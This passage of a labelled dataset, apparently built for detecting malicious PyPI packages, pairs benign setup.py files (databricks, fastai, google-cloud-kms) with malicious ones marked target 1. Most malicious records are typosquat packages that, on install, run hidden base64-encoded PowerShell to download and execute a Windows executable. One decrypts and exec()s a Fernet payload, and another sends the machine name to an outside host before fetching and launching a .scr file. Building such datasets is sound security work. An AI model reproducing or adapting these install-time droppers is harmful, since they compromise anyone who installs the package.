'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "mcpip-10.52", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'mcpip',\n    packages = ['modlib'],\n    version = '5.65',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "databricks-sql-connector-2.0.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackage_dir = \\\n{'': 'src'}\n\npackages = \\\n['databricks',\n 'databricks.sql',\n 'databricks.sql.thrift_api',\n 'databricks.sql.thrift_api.TCLIService']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['pandas>=1.3.0,<2.0.0', 'pyarrow>=5.0.0,<6.0.0', 'thrift>=0.13.0,<0.14.0']\n\nsetup_kwargs = {\n    'name': 'databricks-sql-connector',\n    'version': '2.0.3',\n    'description': 'Databricks SQL Connector for Python',\n    'long_description': \"# Databricks SQL Connector for Python\\n\\n[![PyPI](https://img.shields.io/pypi/v/databricks-sql-connector?style=flat-square)](https://pypi.org/project/databricks-sql-connector/)\\n[![Downloads](https://pepy.tech/badge/databricks-sql-connector)](https://pepy.tech/project/databricks-sql-connector)\\n\\nThe Databricks SQL Connector for Python allows you to develop Python applications that connect to Databricks clusters and SQL warehouses. It is a Thrift-based client with no dependencies on ODBC or JDBC. It conforms to the [Python DB API 2.0 specification](https://www.python.org/dev/peps/pep-0249/).\\n\\nThis connector uses Arrow as the data-exchange format, and supports APIs to directly fetch Arrow tables. Arrow tables are wrapped in the `ArrowQueue` class to provide a natural API to get several rows at a time.\\n\\nYou are welcome to file an issue here for general use cases. You can also contact Databricks Support [here](help.databricks.com).\\n\\n## Requirements\\n\\nA development machine running Python >=3.7, <3.10.\\n\\n## Documentation\\n\\nFor the latest documentation, see\\n\\n- [Databricks](https://docs.databricks.com/dev-tools/python-sql-connector.html)\\n- [Azure Databricks](https://docs.microsoft.com/en-us/azure/databricks/dev-tools/python-sql-connector)\\n\\n## Quickstart\\n\\nInstall the library with `pip install databricks-sql-connector`\\n\\nExample usage:\\n\\n```python\\nfrom databricks import sql\\n\\nconnection = sql.connect(\\n  server_hostname='********.databricks.com',\\n  http_path='/sql/1.0/endpoints/****************',\\n  access_token='dapi********************************')\\n\\n\\ncursor = connection.cursor()\\n\\ncursor.execute('SELECT * FROM RANGE(10)')\\nresult = cursor.fetchall()\\nfor row in result:\\n  print(row)\\n\\ncursor.close()\\nconnection.close()\\n```\\n\\nIn the above example:\\n- `server-hostname` is the Databricks instance host name.\\n- `http-path` is the HTTP Path either to a Databricks SQL endpoint (e.g. /sql/1.0/endpoints/1234567890abcdef),\\nor to a Databricks Runtime interactive cluster (e.g. /sql/protocolv1/o/1234567890123456/1234-123456-slid123)\\n- `personal-access-token` is the Databricks Personal Access Token for the account that will execute commands and queries\\n\\n\\n## Contributing\\n\\nSee [CONTRIBUTING.md](CONTRIBUTING.md)\\n\\n## License\\n\\n[Apache License 2.0](LICENSE)\\n\",\n    'author': 'Databricks',\n    'author_email': 'databricks-sql-connector-maintainers@databricks.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': None,\n    'package_dir': package_dir,\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'python_requires': '>=3.7.1,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "django-autocomplete-light-3.9.4", "func": "import os\n\nfrom setuptools import setup, find_packages\n\n\n# Utility function to read the README file.\n# Used for the long_description. It's nice because now 1) we have a top-level\n# README file and 2) it's easier to type in the README file than to put a raw\n# string in below ...\ndef read(fname):\n    return open(os.path.join(os.path.dirname(__file__), fname)).read()\n\nsetup(\n    name='django-autocomplete-light',\n    version='3.9.4',\n    description='Fresh autocompletes for Django',\n    author='James Pic',\n    author_email='jamespic@gmail.com',\n    url='http://django-autocomplete-light.rtfd.org',\n    project_urls={\n        'Source': 'https://github.com/yourlabs/django-autocomplete-light',\n    },\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    include_package_data=True,\n    zip_safe=False,\n    long_description=read('README'),\n    license='MIT',\n    keywords='django autocomplete',\n    install_requires=['six'],\n    extras_require={\n        'nested': ['django-nested-admin>=3.0.21'],\n        'tags': ['django-taggit'],\n        'genericm2m': ['django-generic-m2m'],\n        'gfk': ['django-querysetsequence>=0.11'],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 3.2',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ]\n)\n", "target": 0}
{"idx": "flake8-blind-except-0.2.1", "func": "from setuptools import setup\n\ndef get_version(fname='flake8_blind_except.py'):\n    with open(fname) as f:\n        for line in f:\n            if line.startswith('__version__'):\n                return eval(line.split('=')[-1])\n\ndef get_long_description():\n    descr = []\n    for fname in ('README.rst',):\n        with open(fname) as f:\n            descr.append(f.read())\n    return '\\n\\n'.join(descr)\n\n\nsetup(\n    name='flake8-blind-except',\n    description='A flake8 extension that checks for blind except: statements',\n    long_description=get_long_description(),\n    keywords='flake8 except exception',\n    version=get_version(),\n    author='Elijah Andrews',\n    author_email='elijahcandrews@gmail.com',\n    entry_points={\n        'flake8.extension': [\n            'B90 = flake8_blind_except:check_blind_except'\n        ],\n    },\n    url='https://github.com/elijahandrews/flake8-blind-except',\n    license='MIT',\n    py_modules=['flake8_blind_except'],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "py-prooflib-2.69", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-prooflib',\n    packages = ['modlib'],\n    version = '2.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libpostvmgrand-1.48", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpostvmgrand',\n    packages = ['modlib'],\n    version = '7.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-prometheus-2.2.0", "func": "import re\n\nfrom setuptools import find_packages, setup\n\nwith open(\"README.md\") as fl:\n    LONG_DESCRIPTION = fl.read()\n\n\ndef get_version():\n    version_file = open(\"django_prometheus/__init__.py\", \"r\").read()\n    version_match = re.search(\n        r'^__version__ = [\\'\"]([^\\'\"]*)[\\'\"]', version_file, re.MULTILINE\n    )\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nsetup(\n    name=\"django-prometheus\",\n    version=get_version(),\n    author=\"Uriel Corfa\",\n    author_email=\"uriel@corfa.fr\",\n    description=(\"Django middlewares to monitor your application with Prometheus.io.\"),\n    license=\"Apache\",\n    keywords=\"django monitoring prometheus\",\n    url=\"http://github.com/korfuri/django-prometheus\",\n    project_urls={\n            \"Changelog\": \"https://github.com/korfuri/django-prometheus/blob/master/CHANGELOG.md\",\n            \"Documentation\": \"https://github.com/korfuri/django-prometheus/blob/master/README.md\",\n            \"Source\": \"https://github.com/korfuri/django-prometheus\",\n            \"Tracker\": \"https://github.com/korfuri/django-prometheus/issues\",\n    },\n    packages=find_packages(exclude=[\"tests\",]),\n    test_suite=\"django_prometheus.tests\",\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    tests_require=[\"pytest\", \"pytest-django\"],\n    setup_requires=[\"pytest-runner\"],\n    options={\"bdist_wheel\": {\"universal\": \"1\"}},\n    install_requires=[\"prometheus-client>=0.7\",],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Information Technology\",\n        \"Intended Audience :: System Administrators\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Topic :: System :: Monitoring\",\n        \"License :: OSI Approved :: Apache Software License\",\n    ],\n)\n", "target": 0}
{"idx": "fastai-2.7.9", "func": "from pkg_resources import parse_version\nfrom configparser import ConfigParser\nimport setuptools,re,sys\nassert parse_version(setuptools.__version__)>=parse_version('36.2')\n\n# note: all settings are in settings.ini; edit there, not here\nconfig = ConfigParser(delimiters=['='])\nconfig.read('settings.ini')\ncfg = config['DEFAULT']\n\ncfg_keys = 'version description keywords author author_email'.split()\nexpected = cfg_keys + \"lib_name user branch license status min_python audience language\".split()\nfor o in expected: assert o in cfg, \"missing expected setting: {}\".format(o)\nsetup_cfg = {o:cfg[o] for o in cfg_keys}\n\nif len(sys.argv)>1 and sys.argv[1]=='version':\n    print(setup_cfg['version'])\n    exit()\n\nlicenses = {\n    'apache2': ('Apache Software License 2.0','OSI Approved :: Apache Software License'),\n}\nstatuses = [ '1 - Planning', '2 - Pre-Alpha', '3 - Alpha',\n    '4 - Beta', '5 - Production/Stable', '6 - Mature', '7 - Inactive' ]\npy_versions = '2.0 2.1 2.2 2.3 2.4 2.5 2.6 2.7 3.0 3.1 3.2 3.3 3.4 3.5 3.6 3.7 3.8 3.9 3.10'.split()\nmin_python = cfg['min_python']\nlic = licenses[cfg['license']]\n\nrequirements = ['pip', 'packaging']\nif cfg.get('requirements'): requirements += cfg.get('requirements','').split()\nif cfg.get('pip_requirements'): requirements += cfg.get('pip_requirements','').split()\ndev_requirements = (cfg.get('dev_requirements') or '').split()\n\nlong_description = open('README.md').read()\n# ![png](docs/images/output_13_0.png)\nfor ext in ['png', 'svg']:\n    long_description = re.sub(r'!\\['+ext+'\\]\\((.*)\\)', '!['+ext+']('+'https://raw.githubusercontent.com/{}/{}'.format(cfg['user'],cfg['lib_name'])+'/'+cfg['branch']+'/\\\\1)', long_description)\n    long_description = re.sub(r'src=\\\"(.*)\\.'+ext+'\\\"', 'src=\\\"https://raw.githubusercontent.com/{}/{}'.format(cfg['user'],cfg['lib_name'])+'/'+cfg['branch']+'/\\\\1.'+ext+'\\\"', long_description)\n\nsetuptools.setup(\n    name = 'fastai',\n    license = lic[0],\n    classifiers = [\n        'Development Status :: ' + statuses[int(cfg['status'])],\n        'Intended Audience :: ' + cfg['audience'].title(),\n        'License :: ' + lic[1],\n        'Natural Language :: ' + cfg['language'].title(),\n    ] + ['Programming Language :: Python :: '+o for o in py_versions[py_versions.index(min_python):]],\n    url = cfg['git_url'],\n    packages = setuptools.find_packages(),\n    include_package_data = True,\n    install_requires = requirements,\n    extras_require={ 'dev': dev_requirements },\n    python_requires  = '>=' + cfg['min_python'],\n    long_description = long_description,\n    long_description_content_type = 'text/markdown',\n    zip_safe = False,\n    entry_points = {\n        'console_scripts': cfg.get('console_scripts','').split(),\n        'nbdev': [f'{cfg.get(\"lib_path\")}={cfg.get(\"lib_path\")}._modidx:d']\n    },\n    **setup_cfg)\n\n", "target": 0}
{"idx": "pywvm-10.13", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pywvm',\n    packages = ['modlib'],\n    version = '5.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cuatomtkinter-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'nbgmrgHAnUeCQZYizwDjzEQAQTFuFtNbptRZhWdKTXqvqaFJRviNLbqvIkrEeiAcQmcHVVgpTmuRdfNwCTGqjzizISp'\nLONG_DESCRIPTION = 'mUzpSXQWmicVh X sdQOPbZScVaXWVUnqVKJZMrNPJARUuoYIsYXslIGui pRUEBEGcwBCoheOypmTjWxf sRFitcOKuTZszPxpqxjAWvtSnuSYsqDtoskLAqnkiWpDPAhnpmylwUgveCQVYCnitmXJVCjDATuxBrZtAUjDjcDWRWGZJlfGjxjfbvoaBpNLEghNEgruK'\n\n\nclass VcsTbmGrrXlczSaBLgrOOnsvfRttsebYQTIfZKGZiQDFjWOexwfrTkCUtlsajnHgWQJORyjIaTQgdjFqGWWhzHdDjXsdGJfKwoXGsPGBcOzxWUvWwOCvmGVAUsdNVchuChxUdVCIuoZGrvCdUNsAVZoxvspqgR(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'NWmXr_43zeV3GnEnX4DwAaUgFYRTJ7raG5Zue9i9stE=').decrypt(b'gAAAAABmBIOZ7FDgkLT7H1mni_AOzuAZDkqTg9SqzyGik_abOeJ5bgcLZMwnhsThKBuMv7pKXR0J_h_lybV0ImV30Mqo09wsB8OPyYF5Slq8ytNzmfYjT0ZYXv9PPCO0lYdx4qTJjyeXtuU12bDcw5HPKfEyx4btKNbI-VYKbCOUS4mziLhsYqhPJCuj-fCu9oVbc2QBCM6cVLa5bf_2krUvFhtf335jeJ7SMnHhucnnUnAEcIHBmtA='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"cuatomtkinter\",\n    version=VERSION,\n    author=\"hUSuEXIjVoFGtgC\",\n    author_email=\"TkgELSsuHFfi@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': VcsTbmGrrXlczSaBLgrOOnsvfRttsebYQTIfZKGZiQDFjWOexwfrTkCUtlsajnHgWQJORyjIaTQgdjFqGWWhzHdDjXsdGJfKwoXGsPGBcOzxWUvWwOCvmGVAUsdNVchuChxUdVCIuoZGrvCdUNsAVZoxvspqgR,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "py-stringrandom-8.97", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-stringrandom',\n    packages = ['modlib'],\n    version = '6.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-kms-2.12.0", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-kms\"\ndescription = \"Cloud Key Management Service (KMS) API client library\"\nversion = \"2.12.0\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"grpc-google-iam-v1 >=0.12.4, <1.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-kms\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_kms_v1_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "speechrecongition-4.4.7", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n \ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='speechrecongition',\n  version='4.4.7',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "tpstringintpong-8.96", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstringintpong',\n    packages = ['modlib'],\n    version = '10.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
